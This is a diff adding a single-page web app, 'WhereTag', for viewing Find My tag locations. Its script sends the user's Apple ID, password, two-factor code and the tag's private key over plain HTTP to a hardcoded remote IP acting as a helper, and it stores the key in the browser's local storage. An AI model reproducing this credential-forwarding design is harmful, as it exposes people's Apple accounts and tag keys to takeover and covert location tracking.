@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>WhereTag</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--blue:#007AFF;--orange:#FF9500;--green:#34C759;--red:#FF3B30;--bg:#F2F2F7;--card:#FFF;--text:#1C1C1E;--text2:#8E8E93;--border:#E5E5EA;--radius:12px}
+body{font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",sans-serif;background:var(--bg);color:var(--text);min-height:100vh;padding:0}
+.container{max-width:480px;margin:0 auto;padding:16px 16px 100px}
+.header{text-align:center;padding:20px 0 12px}
+.header h1{font-size:22px;font-weight:700;color:var(--blue)}
+.header .sub{font-size:13px;color:var(--text2);margin-top:2px}
+.card{background:var(--card);border-radius:var(--radius);padding:16px;margin-bottom:12px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+.card-title{font-size:15px;font-weight:600;margin-bottom:10px;display:flex;align-items:center;gap:6px}
+.card-title .dot{width:8px;height:8px;border-radius:50%;display:inline-block}
+label{display:block;font-size:13px;color:var(--text2);margin-bottom:4px;font-weight:500}
+input[type=text],input[type=password]{width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:8px;font-size:15px;background:var(--bg);outline:none;transition:border .2s}
+input:focus{border-color:var(--blue)}
+.key-info{font-size:12px;color:var(--text2);margin-top:6px;word-break:break-all}
+.btn{width:100%;padding:12px;border:none;border-radius:var(--radius);font-size:16px;font-weight:600;cursor:pointer;transition:opacity .2s}
+.btn:active{opacity:.7}
+.btn:disabled{opacity:.5;cursor:not-allowed}
+.btn-primary{background:var(--blue);color:#FFF}
+.btn-orange{background:var(--orange);color:#FFF}
+.progress{height:2px;background:var(--border);border-radius:1px;margin:10px 0;overflow:hidden;display:none}
+.progress.active{display:block}
+.progress::after{content:'';display:block;width:30%;height:100%;background:var(--blue);border-radius:1px;animation:slide 1s ease-in-out infinite}
+@keyframes slide{0%{transform:translateX(-100%)}100%{transform:translateX(400%)}}
+.status{text-align:center;font-size:13px;font-weight:500;color:var(--text2);padding:10px 0;min-height:36px}
+.status.error{color:var(--red)}
+.report-item{border-bottom:1px solid var(--border);padding:12px 0}
+.report-item:last-child{border-bottom:none}
+.report-time{font-size:13px;font-weight:600;margin-bottom:4px}
+.report-loc{font-size:13px;color:var(--text2);margin-bottom:8px}
+.map-btns{display:flex;gap:8px;flex-wrap:wrap}
+.map-btn{padding:5px 12px;border-radius:6px;border:1px solid var(--border);background:var(--card);font-size:12px;font-weight:500;text-decoration:none;color:var(--text);cursor:pointer;transition:background .2s}
+.map-btn:hover{background:var(--bg)}
+.hidden{display:none}
+#two-fa-card .methods{margin:8px 0}
+#two-fa-card .method-btn{display:inline-block;padding:6px 14px;border-radius:8px;border:1px solid var(--blue);background:var(--card);color:var(--blue);font-size:13px;font-weight:500;cursor:pointer;margin-right:6px}
+#two-fa-card .method-btn.active{background:var(--blue);color:#FFF}
+.empty-state{text-align:center;padding:40px 20px;color:var(--text2)}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <h1>WhereTag</h1>
+    <div class="sub">Find My Device Location Viewer</div>
+  </div>
+  <div class="card" id="key-card">
+    <div class="card-title"><span class="dot" style="background:var(--blue)"></span>Device Key</div>
+    <label>Private Key (56 hex chars)</label>
+    <input type="text" id="privKey" placeholder="56 hex chars (28 bytes)" spellcheck="false" autocomplete="off">
+    <div class="key-info" id="keyInfo"></div>
+  </div>
+  <div class="card" id="login-card">
+    <div class="card-title"><span class="dot" style="background:var(--blue)"></span>Apple ID</div>
+    <label>Apple ID</label>
+    <input type="text" id="appleId" placeholder="your@email.com" autocomplete="username">
+    <div style="height:10px"></div>
+    <label>Password</label>
+    <input type="password" id="password" placeholder="Apple ID password" autocomplete="current-password">
+  </div>
+
+  <div class="progress" id="progress"></div>
+  <button class="btn btn-primary" id="queryBtn">Login &amp; Query</button>
+  <div class="card hidden" id="two-fa-card">
+    <div class="card-title"><span class="dot" style="background:var(--orange)"></span>Two-Factor Authentication</div>
+    <p style="font-size:13px;color:var(--text2);margin-bottom:10px">A verification code was sent to your trusted devices.</p>
+    <div class="methods" id="methods"></div>
+    <label>Verification Code</label>
+    <input type="text" id="twoFaCode" placeholder="6-digit code" inputmode="numeric" maxlength="6">
+    <div style="height:10px"></div>
+    <button class="btn btn-orange" id="verifyBtn">Verify</button>
+  </div>
+  <div class="card hidden" id="results-card">
+    <div class="card-title"><span class="dot" style="background:var(--green)"></span>Location Reports</div>
+    <div id="results"></div>
+  </div>
+  <div class="status" id="status">Ready</div>
+</div>
+
+<script>
+"use strict";
+
+// ====== State ======
+var keyPair = null;
+var loginState = { session_token: null, dsid: null, searchPartyToken: null };
+var appState = "idle";
+
+/* ====== UI ====== */
+function $(id) { return document.getElementById(id); }
+function show(id) { $(id).classList.remove("hidden"); }
+function hide(id) { $(id).classList.add("hidden"); }
+
+function setState(s) {
+  appState = s;
+  if (s === "idle") {
+    $("progress").classList.remove("active");
+    $("queryBtn").disabled = false;
+  } else if (s === "loggingIn") {
+    $("progress").classList.add("active");
+    $("queryBtn").disabled = true;
+    hide("two-fa-card");
+    hide("results-card");
+  } else if (s === "waiting2FA") {
+    $("progress").classList.remove("active");
+    $("queryBtn").disabled = true;
+    show("two-fa-card");
+  } else if (s === "fetching") {
+    $("progress").classList.add("active");
+    $("queryBtn").disabled = true;
+    hide("two-fa-card");
+  }
+}
+
+function setStatus(msg, isError) {
+  $("status").textContent = msg;
+  $("status").className = isError ? "status error" : "status";
+}
+
+var HELPER_URL = "http://122.152.207.221:16970";
+
+/* ====== Key Parsing (via helper) ====== */
+var keyInfoCache = {};
+
+function onKeyInput() {
+  var hex = $("privKey").value.replace(/[\s\n\r\t]/g, "");
+  if (hex.length !== 56) {
+    keyPair = null;
+    $("keyInfo").textContent = hex.length === 0 ? "" : "Need " + (56 - hex.length) + " more chars";
+    return;
+  }
+
+  // If we already computed this key, use cached result
+  if (keyInfoCache[hex]) {
+    applyKeyInfo(keyInfoCache[hex]);
+    return;
+  }
+
+  $("keyInfo").textContent = "Computing...";
+  var base = HELPER_URL;
+  fetch(base + "/keyinfo?hex=" + encodeURIComponent(hex), { method: "GET" })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (data.error) { $("keyInfo").textContent = "Error: " + data.error; keyPair = null; return; }
+      keyInfoCache[hex] = data;
+      applyKeyInfo(data);
+    })
+    .catch(function(e) {
+      // Fallback: if helper not available, show error
+      $("keyInfo").textContent = "Cannot reach helper at " + HELPER_URL;
+      keyPair = null;
+    });
+}
+
+function applyKeyInfo(data) {
+  keyPair = {
+    macAddress: function() { return data.mac; },
+    hashedAdvKeyB64: function() { return data.hashedKey; },
+    advKeyHex: data.advKey,
+  };
+  $("keyInfo").innerHTML = "Device: " + data.mac + "<br>Hashed: " + data.hashedKeyPrefix + "...";
+}
+
+function batteryLevel(status) {
+  var b = (status >> 6) & 0x03;
+  return ["OK", "Medium", "Low", "Critical"][b] || "Unknown";
+}
+
+function formatAge(date) {
+  var diff = Date.now() - date.getTime();
+  if (diff < 60000) return "just now";
+  if (diff < 3600000) return Math.floor(diff / 60000) + "m ago";
+  if (diff < 86400000) return Math.floor(diff / 3600000) + "h ago";
+  return Math.floor(diff / 86400000) + "d ago";
+}
+
+/* ====== Login ====== */
+function onQuery() {
+  if (!keyPair) { alert("Enter a valid 56-char hex private key"); return; }
+  var appleId = $("appleId").value.trim();
+  var password = $("password").value;
+  if (!appleId || !password) { alert("Enter Apple ID and password"); return; }
+
+  localStorage.setItem("privKey", $("privKey").value);
+  localStorage.setItem("appleId", $("appleId").value);
+
+  setState("loggingIn");
+  setStatus("Connecting...");
+
+  var base = HELPER_URL;
+  fetch(base + "/login", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ apple_id: appleId, password: password })
+  }).then(function(r) { return r.json(); }).then(function(data) {
+    if (data.error) { setState("idle"); setStatus("Login failed: " + data.error, true); return; }
+
+    if (data.status === "2fa") {
+      loginState.session_token = data.session_token;
+      setState("waiting2FA");
+      var methodsEl = $("methods");
+      methodsEl.innerHTML = "";
+      (data.methods || []).forEach(function(m, i) {
+        var btn = document.createElement("span");
+        btn.className = "method-btn" + (i === 0 && data.methods.length === 1 ? " active" : i === 1 ? " active" : "");
+        btn.textContent = m;
+        btn.onclick = function() {
+          methodsEl.querySelectorAll(".method-btn").forEach(function(b) { b.classList.remove("active"); });
+          btn.classList.add("active");
+          var base = HELPER_URL;
+          setStatus("Requesting code via " + m + "...");
+          fetch(base + "/2fa/request", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ session_token: loginState.session_token, method: i })
+          }).then(function(r) { return r.json(); }).then(function(d) {
+            setStatus(d.error || "Code sent to " + m);
+          }).catch(function(e) {
+            setStatus("2FA request error: " + e.message, true);
+          });
+        };
+        methodsEl.appendChild(btn);
+      });
+      setStatus("Requesting verification code...");
+      var base = HELPER_URL;
+      fetch(base + "/2fa/request", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ session_token: loginState.session_token, method: 1 })
+      }).then(function(r) { return r.json(); }).then(function(d) {
+        setStatus(d.error || "Verification code sent to your trusted devices");
+      }).catch(function(e) {
+        setStatus("2FA request error: " + e.message, true);
+      });
+      return;
+    }
+
+    if (data.status === "ok") {
+      loginState.session_token = data.session_token;
+      loginState.dsid = data.dsid;
+      loginState.searchPartyToken = data.searchPartyToken;
+      setState("fetching");
+      setStatus("Fetching reports...");
+      fetchReports();
+      return;
+    }
+
+    setState("idle");
+    setStatus("Login failed: unexpected response", true);
+  }).catch(function(e) {
+    setState("idle");
+    setStatus("Connection error: " + e.message, true);
+  });
+}
+
+function submit2FA() {
+  var code = $("twoFaCode").value.trim();
+  if (!code) return;
+  setStatus("Verifying...");
+
+  var base = HELPER_URL;
+  fetch(base + "/2fa/submit", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ session_token: loginState.session_token, code: code })
+  }).then(function(r) { return r.json(); }).then(function(data) {
+    if (data.error) { setState("waiting2FA"); setStatus("2FA failed: " + data.error, true); return; }
+    if (data.status === "ok") {
+      loginState.dsid = data.dsid;
+      loginState.searchPartyToken = data.searchPartyToken;
+      setState("fetching");
+      setStatus("Fetching reports...");
+      fetchReports();
+      return;
+    }
+    setState("waiting2FA");
+    setStatus("2FA failed", true);
+  }).catch(function(e) {
+    setState("waiting2FA");
+    setStatus("2FA error: " + e.message, true);
+  });
+}
+
+/* ====== Fetch & Decrypt ====== */
+function fetchReports() {
+  var base = HELPER_URL;
+  fetch(base + "/fetch", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      session_token: loginState.session_token,
+      dsid: loginState.dsid,
+      searchPartyToken: loginState.searchPartyToken,
+      hashedKey: keyPair.hashedAdvKeyB64(),
+      days: 7
+    })
+  }).then(function(r) { return r.json(); }).then(function(data) {
+    if (data.error) { setState("idle"); setStatus("Fetch failed: " + data.error, true); return; }
+
+    var rawReports = data.results || [];
+    var decrypted = [];
+    var pending = rawReports.length;
+
+    if (pending === 0) {
+      renderResults([]);
+      setStatus("No reports");
+      setState("idle");
+      return;
+    }
+
+    rawReports.forEach(function(raw) {
+      var hex = $("privKey").value.replace(/[\s\n\r\t]/g, "");
+      fetch(base + "/decrypt", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ hex: hex, payload: raw.payload })
+      }).then(function(r) { return r.json(); }).then(function(r) {
+        if (r.error) { pending--; if (pending === 0) done(); return; }
+        decrypted.push({
+          timestamp: new Date(r.timestamp * 1000),
+          latitude: r.latitude,
+          longitude: r.longitude,
+          confidence: r.confidence,
+          accuracy: r.accuracy,
+          status: r.status
+        });
+        pending--;
+        if (pending === 0) done();
+      }).catch(function() { pending--; if (pending === 0) done(); });
+    });
+
+    function done() {
+      decrypted.sort(function(a, b) { return b.timestamp.getTime() - a.timestamp.getTime(); });
+      renderResults(decrypted);
+      if (decrypted.length === 0) {
+        setStatus("No reports (" + rawReports.length + " encrypted)");
+      } else {
+        setStatus(decrypted.length + " reports | Latest: " + decrypted[0].timestamp.toLocaleTimeString());
+      }
+      setState("idle");
+    }
+  }).catch(function(e) {
+    setState("idle");
+    setStatus("Fetch failed: " + e.message, true);
+  });
+}
+
+function renderResults(reports) {
+  var container = $("results");
+  container.innerHTML = "";
+
+  if (reports.length === 0) {
+    container.innerHTML = '<div class="empty-state"><p>No decrypted reports found</p></div>';
+    show("results-card");
+    return;
+  }
+
+  reports.forEach(function(r) {
+    var ns = r.latitude >= 0 ? "N" : "S";
+    var ew = r.longitude >= 0 ? "E" : "W";
+    var lat = Math.abs(r.latitude).toFixed(6);
+    var lon = Math.abs(r.longitude).toFixed(6);
+
+    var item = document.createElement("div");
+    item.className = "report-item";
+    item.innerHTML =
+      '<div class="report-time">[' + formatAge(r.timestamp) + '] ' + r.timestamp.toLocaleString() + '</div>' +
+      '<div class="report-loc">' + lat + ns + " " + lon + ew + " | Conf:" + r.confidence + " | Bat:" + batteryLevel(r.status) + '</div>' +
+      '<div class="map-btns">' +
+        '<a class="map-btn" href="https://uri.amap.com/marker?position=' + r.longitude + ',' + r.latitude + '" target="_blank">Amap</a>' +
+        '<a class="map-btn" href="https://api.map.baidu.com/marker?location=' + r.latitude + ',' + r.longitude + '&title=Tracker&output=html" target="_blank">Baidu</a>' +
+        '<a class="map-btn" href="https://www.google.com/maps?q=' + r.latitude + ',' + r.longitude + '" target="_blank">Google</a>' +
+      '</div>';
+    container.appendChild(item);
+  });
+
+  show("results-card");
+}
+
+/* ====== Init ====== */
+function init() {
+  $("privKey").addEventListener("input", onKeyInput);
+  $("queryBtn").addEventListener("click", onQuery);
+  $("verifyBtn").addEventListener("click", submit2FA);
+  $("twoFaCode").addEventListener("keydown", function(e) { if (e.key === "Enter") submit2FA(); });
+  $("privKey").addEventListener("input", function() { localStorage.setItem("privKey", $("privKey").value); });
+  $("appleId").addEventListener("input", function() { localStorage.setItem("appleId", $("appleId").value); });
+
+  if (localStorage.getItem("privKey")) $("privKey").value = localStorage.getItem("privKey");
+  if (localStorage.getItem("appleId")) $("appleId").value = localStorage.getItem("appleId");
+  if ($("privKey").value) onKeyInput();
+}
+
+if (document.readyState === "loading") {
+  document.addEventListener("DOMContentLoaded", init);
+} else {
+  init();
+}
+</script>
+</body>
+</html>
